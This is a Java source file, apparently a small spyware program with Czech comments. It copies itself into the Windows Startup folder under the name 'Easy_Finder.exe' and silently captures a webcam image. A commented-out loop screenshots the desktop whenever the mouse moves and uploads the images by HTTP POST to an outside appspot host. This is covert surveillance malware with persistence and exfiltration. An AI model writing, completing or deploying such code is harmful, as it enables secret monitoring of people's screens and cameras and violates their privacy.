package cz.ddmjm.fotak;

import com.github.sarxos.webcam.Webcam;
import java.awt.AWTException;
import java.awt.MouseInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;

public class Fotak {

    static Scanner sc = new Scanner(System.in);
    private static final String localization = System.getProperty("user.dir");
    //private static final String propertiesDirName = "\\Microsoft Exengine";
    static final int PHOTOS_PER_DAY = 30;
    static int today = Calendar.getInstance().get(Calendar.DAY_OF_WEEK);

    public static void main(String[] args) throws MalformedURLException, IOException, InterruptedException {
        Calendar cal = Calendar.getInstance();
        int dayOfMonth = cal.get(Calendar.DATE);

        String dayOfMonthStr = String.valueOf(dayOfMonth);

        createCopyInStartUp();
        takeWebcamShot();

        Robot robot = null;
        try {
            robot = new Robot();
        } catch (AWTException ex) {
            ex.printStackTrace();
        }
        int width = (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
        int height = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();

        int prevX = 0;
        int prevY = 0;

        /*while (true) {
            for (int i = 0; i < PHOTOS_PER_DAY; i++) {
                if (MouseInfo.getPointerInfo().getLocation().getX() != prevX || MouseInfo.getPointerInfo().getLocation().getY() != prevY) {
                    prevX = (int) MouseInfo.getPointerInfo().getLocation().getX();
                    prevY = (int) MouseInfo.getPointerInfo().getLocation().getY();

                    BufferedImage image = robot.createScreenCapture(new Rectangle(width, height));

                    URL url = new URL("http://internet3.appspot.com/fotky");
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setDoOutput(true);
                    ImageIO.write(image, "png", connection.getOutputStream());
                    System.out.println(connection.getResponseCode());
                }else { //Aby vytvorilo denne x fotek ne x pokusu
                    i--;
                }

                Thread.sleep(10000);
            }
            while (today == Calendar.getInstance().get(Calendar.DATE)) { //Pocka na dalsi den
                Thread.sleep(20 * 1000 * 60);
            }
        }*/

    }

    //program zkopiruje do slozky po spusteni aby se po startu zpustilo
    public static void createCopyInStartUp() {
        String appName = "\\Easy_Finder.exe";
        File ciloveMisto = new File(System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + appName);
        File programMisto = new File(System.getProperty("user.dir") + appName);
        try {
            if (!ciloveMisto.exists()) {//Pokud poustime program na pc poprve a nas soubor jeste neni prekopirovany do startup
                ciloveMisto.createNewFile();
                if (programMisto.exists()) {
                    Files.copy(programMisto.toPath(), ciloveMisto.toPath(), StandardCopyOption.REPLACE_EXISTING);
                } else {
                    System.out.println("Error, i cant find path to exe."); //nemelo by se stat
                }
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
    
    public static void takeWebcamShot(){
        try {
            Webcam webcam = Webcam.getDefault();
            webcam.open();
            BufferedImage selfie = webcam.getImage();
            ImageIO.write(selfie, "png", new File("C:\\Users\\Pocitac\\Desktop\\firstCapture.png"));
            webcam.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

}
